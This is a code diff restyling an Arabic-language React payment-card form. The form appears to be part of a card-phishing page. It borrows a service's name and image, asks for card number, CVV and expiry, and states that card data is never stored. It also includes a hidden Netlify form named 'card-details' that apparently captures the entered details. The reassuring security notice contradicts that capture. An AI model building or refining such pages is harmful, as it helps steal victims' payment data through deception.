@@ -87,155 +87,179 @@ const PaymentCardForm = () => {
   
   return (
     <div 
-      className="min-h-screen py-12" 
+      className="min-h-screen"
       dir="rtl"
       style={{
-        background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
+        background: 'linear-gradient(180deg, #0a0e27 0%, #1a1f3a 100%)',
       }}
     >
-      <div className="container mx-auto px-4">
+      {/* Header Image */}
+      {branding.ogImage && (
+        <div className="w-full">
+          <img 
+            src={branding.ogImage} 
+            alt={serviceName}
+            className="w-full h-48 object-cover"
+            onError={(e) => e.currentTarget.style.display = 'none'}
+          />
+        </div>
+      )}
+
+      <div className="container mx-auto px-4 py-8">
         <div className="max-w-md mx-auto">
-          {/* Service Logo */}
-          {branding.logo && (
-            <div className="text-center mb-6">
-              <img 
-                src={branding.logo} 
-                alt={serviceName}
-                className="h-16 mx-auto mb-4"
-                onError={(e) => e.currentTarget.style.display = 'none'}
+          
+          {/* Title Section */}
+          <div className="text-center mb-6">
+            <h1 className="text-3xl font-bold text-white mb-2">بيانات البطاقة</h1>
+            <p className="text-gray-400">الدفع الآمن</p>
+          </div>
+
+          {/* Security Notice */}
+          <div 
+            className="rounded-lg p-3 mb-6 flex items-start gap-2"
+            style={{
+              background: 'rgba(59, 130, 246, 0.1)',
+              border: '1px solid rgba(59, 130, 246, 0.3)'
+            }}
+          >
+            <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0 text-blue-400" />
+            <p className="text-sm text-blue-300">
+              بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
+            </p>
+          </div>
+
+          {/* Visual Card Display */}
+          <div 
+            className="rounded-2xl p-6 mb-6 relative overflow-hidden"
+            style={{
+              background: 'linear-gradient(135deg, #7c3aed 0%, #ea580c 100%)',
+              minHeight: '200px'
+            }}
+          >
+            <div className="absolute top-4 right-4">
+              <CreditCard className="w-12 h-12 text-white/80" />
+            </div>
+            
+            {/* Card Number Display */}
+            <div className="mt-16 mb-6">
+              <div className="flex gap-3 text-white text-2xl font-mono">
+                <span>••••</span>
+                <span>••••</span>
+                <span>••••</span>
+                <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
+              </div>
+            </div>
+
+            <div className="flex justify-between items-end text-white">
+              <div>
+                <p className="text-xs opacity-70 mb-1">EXPIRES</p>
+                <p className="text-lg font-mono">{expiry || "MM/YY"}</p>
+              </div>
+              <div className="text-right">
+                <p className="text-xs opacity-70 mb-1">CARDHOLDER</p>
+                <p className="text-lg font-bold">{cardName || "YOUR NAME"}</p>
+              </div>
+            </div>
+          </div>
+
+          {/* Form */}
+          <form onSubmit={handleSubmit} className="space-y-5">
+            {/* Cardholder Name */}
+            <div>
+              <Label className="mb-2 text-white">اسم حامل البطاقة</Label>
+              <Input
+                placeholder="AHMAD ALI"
+                value={cardName}
+                onChange={(e) => setCardName(e.target.value.toUpperCase())}
+                className="h-14 text-lg bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500"
+                required
               />
             </div>
-          )}
-          
-          {/* Security Badge */}
-          <div className="text-center mb-6">
-            <Badge 
-              className="text-sm px-4 py-2"
-              style={{ 
-                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
-                color: 'white'
-              }}
-            >
-              <Lock className="w-4 h-4 ml-2" />
-              <span>معاملة آمنة ومشفّرة</span>
-            </Badge>
-          </div>
-          
-          <Card className="p-8 shadow-elevated">
-            <div className="flex items-center gap-3 mb-6">
-              <div 
-                className="w-12 h-12 rounded-xl flex items-center justify-center"
-                style={{
-                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-                }}
-              >
-                <CreditCard className="w-6 h-6 text-white" />
-              </div>
-              <div>
-                <h1 className="text-2xl font-bold">بيانات البطاقة</h1>
-                <p className="text-sm text-muted-foreground">الدفع الآمن</p>
-              </div>
+            
+            {/* Card Number */}
+            <div>
+              <Label className="mb-2 text-white">رقم البطاقة</Label>
+              <Input
+                placeholder="•••• •••• •••• ••••"
+                value={cardNumber}
+                onChange={(e) =>
+                  setCardNumber(formatCardNumber(e.target.value.slice(0, 19)))
+                }
+                inputMode="numeric"
+                type="password"
+                className="h-14 text-lg tracking-wider bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500"
+                required
+              />
             </div>
             
-            {/* Info Alert */}
-            <div 
-              className="border rounded-lg p-3 mb-6 flex items-start gap-2"
-              style={{
-                background: `${branding.colors.primary}10`,
-                borderColor: `${branding.colors.primary}30`
-              }}
-            >
-              <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
-              <p className="text-sm" style={{ color: branding.colors.primary }}>
-                بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
-              </p>
-            </div>
-            
-            <form onSubmit={handleSubmit} className="space-y-5">
-              {/* Cardholder Name */}
+            {/* CVV, Year, Month Row */}
+            <div className="grid grid-cols-3 gap-3">
               <div>
-                <Label className="mb-2">اسم حامل البطاقة</Label>
+                <Label className="mb-2 text-white text-xs">CVV</Label>
                 <Input
-                  placeholder="AHMAD ALI"
-                  value={cardName}
-                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
-                  className="h-12 text-lg"
-                  required
-                />
-              </div>
-              
-              {/* Card Number */}
-              <div>
-                <Label className="mb-2">رقم البطاقة</Label>
-                <Input
-                  placeholder="4242 4242 4242 4242"
-                  value={cardNumber}
+                  placeholder="•••"
+                  value={cvv}
                   onChange={(e) =>
-                    setCardNumber(formatCardNumber(e.target.value.slice(0, 19)))
+                    setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
                   }
                   inputMode="numeric"
-                  className="h-12 text-lg tracking-wider"
+                  type="password"
+                  className="h-14 text-lg text-center bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500"
                   required
                 />
               </div>
               
-              {/* Expiry & CVV */}
-              <div className="grid grid-cols-2 gap-4">
-                <div>
-                  <Label className="mb-2">تاريخ الانتهاء</Label>
-                  <Input
-                    placeholder="MM/YY"
-                    value={expiry}
-                    onChange={(e) =>
-                      setExpiry(formatExpiry(e.target.value.slice(0, 4)))
-                    }
-                    inputMode="numeric"
-                    className="h-12 text-lg"
-                    required
-                  />
-                </div>
-                
-                <div>
-                  <Label className="mb-2">CVV</Label>
-                  <Input
-                    placeholder="123"
-                    value={cvv}
-                    onChange={(e) =>
-                      setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
-                    }
-                    inputMode="numeric"
-                    type="password"
-                    className="h-12 text-lg"
-                    required
-                  />
-                </div>
+              <div>
+                <Label className="mb-2 text-white text-xs">السنة</Label>
+                <Input
+                  placeholder="YY"
+                  value={expiry.split('/')[1] || ''}
+                  onChange={(e) => {
+                    const year = e.target.value.replace(/\D/g, "").slice(0, 2);
+                    const month = expiry.split('/')[0] || '';
+                    setExpiry(month && year ? `${month}/${year}` : year ? `/${year}` : month);
+                  }}
+                  inputMode="numeric"
+                  className="h-14 text-lg text-center bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500"
+                  required
+                />
               </div>
-              
-              {/* Submit Button */}
-              <Button
-                type="submit"
-                size="lg"
-                className="w-full text-lg py-7 mt-6 text-white"
-                style={{
-                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-                }}
-              >
-                <Shield className="w-5 h-5 ml-2" />
-                <span>تفويض البطاقة</span>
-              </Button>
-              
-              <p className="text-xs text-center text-muted-foreground mt-3">
-                سيتم إرسال رمز التحقق إلى هاتفك المسجل
-              </p>
-            </form>
-          </Card>
-          
-          {/* Security Icons */}
-          <div className="flex items-center justify-center gap-6 mt-8 opacity-60">
-            <Shield className="w-5 h-5" />
-            <Lock className="w-5 h-5" />
-            <CreditCard className="w-5 h-5" />
-          </div>
+
+              <div>
+                <Label className="mb-2 text-white text-xs">الشهر</Label>
+                <Input
+                  placeholder="MM"
+                  value={expiry.split('/')[0] || ''}
+                  onChange={(e) => {
+                    const month = e.target.value.replace(/\D/g, "").slice(0, 2);
+                    const year = expiry.split('/')[1] || '';
+                    setExpiry(month && year ? `${month}/${year}` : month);
+                  }}
+                  inputMode="numeric"
+                  className="h-14 text-lg text-center bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500"
+                  required
+                />
+              </div>
+            </div>
+            
+            {/* Submit Button */}
+            <Button
+              type="submit"
+              size="lg"
+              className="w-full text-xl py-7 mt-6 font-bold"
+              style={{
+                background: 'linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%)',
+                color: '#000'
+              }}
+            >
+              <Shield className="w-6 h-6 ml-2" />
+              <span>تفويض البطاقة</span>
+            </Button>
+            
+            <p className="text-xs text-center text-gray-400 mt-3">
+              سيتم إرسال رمز التحقق إلى هاتفك المسجل
+            </p>
+          </form>
           
           {/* Hidden Netlify Form */}
           <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
